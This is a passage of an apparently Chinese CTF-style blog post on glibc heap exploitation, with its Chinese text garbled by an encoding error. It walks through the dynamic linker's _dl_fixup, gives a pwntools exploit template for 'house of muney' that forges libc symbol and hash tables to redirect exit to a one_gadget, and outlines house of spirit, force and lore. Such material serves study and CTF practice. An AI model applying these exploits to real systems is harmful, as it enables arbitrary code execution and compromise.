mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x7ffff7fd8ddb &lt;_dl_runtime_resolve_xsavec+171&gt;:     mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8ddf &lt;_dl_runtime_resolve_xsavec+175&gt;:     mov    rsp,rbx</span><br><span class="line">   0x7ffff7fd8de2 &lt;_dl_runtime_resolve_xsavec+178&gt;:     mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8de6 &lt;_dl_runtime_resolve_xsavec+182&gt;:     add    rsp,0x18</span><br><span class="line">   0x7ffff7fd8dea &lt;_dl_runtime_resolve_xsavec+186&gt;:     jmp    r11</span><br></pre></td></tr></table></figure><p>ä¿å­˜å·¥ä½œçŠ¶æ€ï¼Œç„¶å<code>jmp r11ï¼Œå³jmp _dl_fixup</code></p><p>ä¸€ä¸‹åˆ†æ<code>_dl_fixup</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">   first time each PLT entry is called.  We must perform the relocation</span></span><br><span class="line"><span class="comment">   specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">   function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">   to that address.  Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">   function.  */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, <span class="built_in">ElfW</span>(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œçš„læ˜¯äºŒè¿›åˆ¶ç¨‹åºæœ¬èº«çš„link_mapï¼Œè€Œä¸æ˜¯soçš„</span></span><br><span class="line">  <span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸Šé¢çš„mï¼Œå³codebaseï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸Šè¿°çš„nï¼Œå³.rela.pltçš„åç§»</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// é¦–å…ˆæ ¹æ®link_mapä¸­è®°å½•çš„ä¿¡æ¯ï¼Œæ‰¾åˆ°åŠ¨æ€é“¾æ¥ç›¸å…³çš„ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨</span></span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ‰¾åˆ°å¯¹åº”çš„é‡å®šä½å…ƒç´ ã€ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (<span class="built_in">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="comment">// rel_addr å³ä¸ºgotè¡¨çš„åœ°å€ï¼Œåœ¨æŸ¥æ‰¾åˆ°ç¬¦å·çœŸå®åœ°å€ä¹‹åä¼šå›å¡«åˆ°è¿™ä¸ªåœ°å€ä¸­</span></span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  <span class="built_in">assert</span> (<span class="built_in">ELFW</span>(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (<span class="built_in">ELFW</span>(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">r_found_version</span> *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)]);</span><br><span class="line">  <span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">THREAD_GSCOPE_SET_FLAG</span> ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²åœ°å€ï¼Œæ ¹æ®ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨å¾—åˆ°çš„</span></span><br><span class="line"><span class="comment">// ç¬¬äºŒä¸ªå‚æ•°æ˜¯link_map</span></span><br><span class="line"><span class="comment">// ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç¬¦å·è¡¨çš„åœ°å€ï¼Œæ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œæœ€åä¼šä¿®æ­£å¾—åˆ°çš„ç¬¦å·è¡¨</span></span><br><span class="line"><span class="comment">// ç¬¬å››ä¸ªå‚æ•°æ˜¯scopeï¼Œè¡¨ç¤ºæŸ¥æ‰¾çš„èŒƒå›´</span></span><br><span class="line"><span class="comment">// ç¬¬äº”ä¸ªå‚æ•°æ˜¯ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line"><span class="comment">// åé¢çš„å‚æ•°éƒ½æ˜¯å›ºå®šçš„</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line"><span class="built_in">THREAD_GSCOPE_RESET_FLAG</span> ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (result,</span><br><span class="line">   <span class="built_in">SYMBOL_ADDRESS</span> (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (l, <span class="built_in">SYMBOL_ADDRESS</span> (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = <span class="built_in">elf_machine_plt_value</span> (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (<span class="built_in">ELFW</span>(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = <span class="built_in">elf_ifunc_invoke</span> (<span class="built_in">DL_FIXUP_VALUE_ADDR</span> (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">// ä¿®æ­£gotè¡¨æ¡ç›®</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">elf_machine_fixup_plt</span> (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªäº†è§£äº†å¤§æ¦‚æµç¨‹</p><h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p><code>ptmalloc</code> å †åˆ†é…å™¨åœ¨åˆ†é…è¶…å¤§å†…å­˜ <code>&gt; 128K</code> çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ <code>mmap</code> ç”³è¯·ç³»ç»Ÿå†…å­˜ï¼Œæ­¤æ—¶ç”³è¯·åˆ°çš„å†…å­˜ä¸€èˆ¬ä½äº <code>libc.so.6</code> æ˜ å°„çš„å†…å­˜åœ°å€çš„ä½åœ°å€å¤„ã€‚<code>house of muney</code> çš„æ ¸å¿ƒåœ¨äºä¿®æ”¹ <code>mmap</code> å†…å­˜çš„ <code>size</code> å¤§å°ï¼Œä½¿å…¶èƒ½æŠŠ <code>libc.so.6</code> çš„ç¬¦å·è¡¨ã€å“ˆå¸Œè¡¨ç­‰æ•°æ®æ‰€åœ¨çš„åœ°å€ç©ºé—´ä¹Ÿé‡Šæ”¾æ‰ã€‚ç„¶åå†æŠŠè¿™ä¸€ç‰‡ç©ºé—´ç»™ç”³è¯·å›æ¥ï¼Œå°±èƒ½ä¼ªé€ ç¬¦å·è¡¨ã€å“ˆå¸Œè¡¨ï¼Œé‚£ä¹ˆåœ¨è§£æå‡½æ•°å®é™…åœ°å€çš„æ—¶å€™å°±èƒ½æ§åˆ¶å…¶è§£æä¸ºä»»æ„åœ°å€ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</p><ol><li><code>A = mmap(addr=NULL, length=0x1000,...)</code></li><li>ä¿®æ”¹ <code>A</code> çš„ <code>size</code>ï¼Œä¸º <code>0x1000 + XXX</code></li><li><code>free(A)</code>ï¼Œå®é™…æ‰§è¡Œçš„æ˜¯ï¼š<code>munmap(A, 0x1000 + XXX)</code>ï¼Œå°±å¯ä»¥å·å– <code>glibc</code> çš„å†…å­˜</li><li><code>mmap(addr=NULL, length=0x1000 + XXX, ... )</code>ï¼Œç„¶åè¾“å…¥æ•°æ®ï¼Œå°±å¯ä»¥æ§åˆ¶ â€œå·å»â€ çš„å†…å­˜çš„å†…å®¹</li><li>åœ¨è¿›è¡Œç¬¦å·è§£æçš„æ—¶å€™ï¼Œè¿›è¡Œä»»æ„å‡½æ•°è°ƒç”¨</li></ol><p>éœ€è¦ä¼ªé€ çš„ç»“æ„æœ‰ï¼š</p><ol><li><strong>bitmask_word</strong></li><li><strong>bucket</strong></li><li><strong>hasharr</strong>ï¼Œéœ€è¦å¤šä¼ªé€ å‡ ä¸ªï¼Œå¹¶ä¸æ˜¯ç¬¬ä¸€ä¸ªå°±æ»¡è¶³æ¡ä»¶</li><li><strong>target symbol -&gt;st_value</strong>ï¼Œç¬¦å·è¡¨ä¸­ï¼Œé™¤äº†st_valueä¿®æ”¹ä¸ºç›®æ ‡åœ°å€å¤–ï¼Œå…¶ä»–æˆå‘˜å»ºè®®ä¿æŒä¸å˜</li></ol><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¼ªé€ ç¬¦å·è¡¨ï¼Œè®©åˆæ¬¡è°ƒç”¨funcAæ—¶çš„çœŸå®åœ°å€ï¼Œè§£ææˆfuncBè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœ</p><p>ç»™å‡ºæ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)   </span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>, -<span class="number">8</span>, p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))  <span class="comment">#ä¿®æ”¹sizeï¼Œä»¥è®©mmapå¯ä»¥ç”³è¯·åˆ°libcæ®µä¸Šçš„ç©ºé—´ï¼ˆmallocè¿‡å¤§çš„chunkä¼šé‡æ–°ç”³è¯·ä¸€ä¸ªæ®µæ¥å­˜å‚¨chunkï¼Œè¯¥æ®µä¸libcæ¥è¿‘ï¼‰</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Prepare offsets and gadgets</span></span><br><span class="line">base_off = <span class="number">0x7dff0</span>                           <span class="comment">#mmapæ®µä¸libc_baseçš„å·®å€¼</span></span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Calculate hash and offsets</span></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = <span class="built_in">int</span>(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Prepare the new symbol entry for `exit`</span></span><br><span class="line">sym_value = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">b&#x27;exit\x00&#x27;</span>).__next__() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name </span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value  #ç›®æ ‡åœ°å€----------------------</span></span><br><span class="line">sym_value += p64(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Edit the heap to overwrite the hash table and symbol table</span></span><br><span class="line">edit(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + hasharr_off, p32(namehash))</span><br><span class="line">edit(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment"># Step 6: Trigger the exploit</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;option:&quot;</span>, <span class="string">b&quot;5&quot;</span>)   <span class="comment">#é¦–æ¬¡è°ƒç”¨exitå‡½æ•°</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><h3 id="æ¼æ´æˆå› -1"><a href="#æ¼æ´æˆå› -1" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™</p><h3 id="é€‚ç”¨èŒƒå›´-1"><a href="#é€‚ç”¨èŒƒå›´-1" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li></ul><h3 id="åˆ©ç”¨åŸç†-1"><a href="#åˆ©ç”¨åŸç†-1" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨å †æº¢å‡ºï¼Œä¿®æ”¹ <code>chunk size</code>ï¼Œä¼ªé€ å‡º <code>fake chunk</code>ï¼Œç„¶åé€šè¿‡å †çš„é‡Šæ”¾å’Œæ’å¸ƒï¼Œæ§åˆ¶ <code>fake chunk</code>ã€‚<code>house of spirit</code> çš„æ“ä½œæ€è·¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¯ä»¥æŒ‰å¦‚ä¸‹æ“ä½œè¿›è¡Œåˆ©ç”¨ï¼š</p><ul><li>ç”³è¯· <code>chunk Aã€chunk Bã€chunk Cã€chunk D</code></li><li>å¯¹ <code>A</code> å†™æ“ä½œçš„æ—¶å€™æº¢å‡ºï¼Œä¿®æ”¹ <code>B</code> çš„ <code>size</code> åŸŸï¼Œä½¿å…¶èƒ½åŒ…æ‹¬ <code>chunk C</code></li><li>é‡Šæ”¾ <code>B</code>ï¼Œç„¶åæŠŠ <code>B</code> ç”³è¯·å›æ¥ï¼Œå†é‡Šæ”¾ <code>C</code>ï¼Œåˆ™å¯ä»¥é€šè¿‡è¯»å†™ <code>B</code> æ¥æ§åˆ¶ <code>C</code> çš„å†…å®¹</li></ul><h3 id="ç›¸å…³æŠ€å·§-1"><a href="#ç›¸å…³æŠ€å·§-1" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>èµ·åˆ <code>house of spirit</code> ä¸»è¦æ˜¯é’ˆå¯¹ <code>fastbin</code>ï¼Œåæ¥å¼•å…¥äº† <code>tcachebin</code> åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>tcachebin</code> ç‰ˆæœ¬çš„ <code>house of spirit</code>ã€‚åˆ©ç”¨æ–¹æ³•ä¸ <code>fastbin</code> åœºæ™¯ä¸‹ç±»ä¼¼ï¼Œæ³¨æ„å¥½ä¸åŒç‰ˆæœ¬ä¸‹çš„æ£€æŸ¥æ¡ä»¶å³å¯ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-1"><a href="#åˆ©ç”¨æ•ˆæœ-1" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>åŠ«æŒ <code>fastbin/tcachebin</code> çš„ <code>fd</code> ä¹‹åï¼Œå¯ä»¥ä»»æ„åœ°å€åˆ†é…ã€ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><h3 id="æ¼æ´æˆå› -2"><a href="#æ¼æ´æˆå› -2" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™ <code>top_chunk</code></p><h3 id="é€‚ç”¨èŒƒå›´-2"><a href="#é€‚ç”¨èŒƒå›´-2" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.28</code></li><li>å¯åˆ†é…ä»»æ„å¤§å°çš„ <code>chunk</code></li><li>éœ€è¦æ³„éœ²æˆ–å·²çŸ¥åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-2"><a href="#åˆ©ç”¨åŸç†-2" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å¯¹ <code>top_chunk</code> çš„åˆ©ç”¨ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code></li><li>å†™ <code>A</code> çš„æ—¶å€™æº¢å‡ºï¼Œä¿®æ”¹ <code>top_chunk</code> çš„ <code>size</code> ä¸ºå¾ˆå¤§çš„æ•°</li><li>åˆ†é…å¾ˆå¤§çš„ <code>chunk</code> åˆ°ä»»æ„å·²çŸ¥åœ°å€</li></ul><h3 id="ç›¸å…³æŠ€å·§-2"><a href="#ç›¸å…³æŠ€å·§-2" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>æ³¨æ„ï¼Œåœ¨ <code>glibc-2.29</code> ååŠ å…¥äº†æ£€æµ‹ï¼Œ<code>house of force</code> åŸºæœ¬å¤±æ•ˆï¼š</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250217172739313.png" alt="image-20250217172739313"></p><h3 id="åˆ©ç”¨æ•ˆæœ-2"><a href="#åˆ©ç”¨æ•ˆæœ-2" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="æ¼æ´æˆå› -3"><a href="#æ¼æ´æˆå› -3" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code>ã€<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-3"><a href="#é€‚ç”¨èŒƒå›´-3" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>éœ€è¦æ³„éœ²æˆ–å·²çŸ¥åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-3"><a href="#åˆ©ç”¨åŸç†-3" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>æ§åˆ¶ <code>smallbin</code> çš„ <code>bk</code> æŒ‡é’ˆï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk Aã€chunk Bã€chunk C</code>ï¼Œå…¶ä¸­ <code>chunk B</code> å¤§å°ä½äº <code>smallbin</code></li><li>é‡Šæ”¾ <code>B</code>ï¼Œç”³è¯·æ›´å¤§çš„ <code>chunk D</code>ï¼Œä½¿å¾— 